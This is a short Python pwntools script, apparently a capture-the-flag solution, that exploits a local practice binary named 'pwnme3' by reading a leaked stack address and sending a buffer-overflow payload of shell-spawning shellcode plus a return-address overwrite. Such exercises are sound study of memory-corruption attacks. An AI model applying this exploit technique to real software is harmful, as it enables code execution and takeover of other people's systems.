import pwn
from templates import buff_overflow


def main():
    # start up the binary
    pwn.context.arch = 'amd64'
    proc = pwn.process('./pwnme3')

    # make the shellcode, and then inject onto the top of the stack
    shell_code = pwn.asm(pwn.shellcraft.sh())
    proc.recvuntil(b"What's this?")
    leak = proc.recvline()
    payload = shell_code + b"a" * (88 - len(shell_code)) + pwn.p64(int(leak, 16))

    buff_overflow(
        payload,
        proc,
        interactive = False
    )


main()
